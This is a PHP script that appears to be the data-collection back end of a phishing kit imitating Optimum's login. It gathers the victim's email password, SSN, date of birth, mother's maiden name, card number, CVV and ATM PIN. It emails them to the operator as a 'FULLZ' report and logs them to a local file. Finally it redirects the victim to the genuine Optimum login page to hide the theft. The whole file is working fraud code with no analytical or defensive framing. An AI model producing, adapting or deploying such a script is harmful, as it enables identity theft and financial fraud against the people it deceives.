<?php

ini_set("output_buffering",4096);
session_start();
ob_start();

include 'Email.php';

$message .= "--------------[ E M A I L ]--------------------\n";
$message .= "Email Address  : ".$_SESSION['id1']."\n";
$message .= "Email Password : ".$_SESSION['pass']."\n";
$message .= "--------------[ P E R S O N A L ]---------------------\n";
$message .= "Full Name      : ".$_POST['fname']." ".$_POST['lname']."\n";
$message .= "Address        : ".$_POST['add']."\n";
$message .= "ZipCode        : ".$_POST['zip']."\n";
$message .= "phone Number   : ".$_POST['phone']."\n";
$message .= "phone PIN      : ".$_POST['ppin']."\n";
$message .= "SSN            : ".$_POST['ssn']."\n";
$message .= "Date Of Birth  : ".$_POST['dob']."\n";
$message .= "MMN            : ".$_POST['mmn']."\n";
$message .= "--------------[ C A R D ]---------------------\n";
$message .= "DL 		    : ".$_POST['dl']."\n";
$message .= "Card Number    : ".$_POST['cc']."\n";
$message .= "EXP. Date      : ".$_POST['exp']."\n";
$message .= "CVV            : ".$_POST['cvv']."\n";
$message .= "ATM PIN        : ".$_POST['pin']."\n";
$message .= "--------------[ I P ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ C O N A N ]--------------------\n";
$subject = "FULLZ OPTimum  $ip";
$headers = "From: Mr.Conan <webmaster@server.com>";
mail($SEND,$subject,$message,$headers);

$file = fopen("mco.txt", 'a');

fwrite($file, $message);

session_destroy();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

$Logon="https://www.optimum.net/login/";

header("location: $Logon");

?>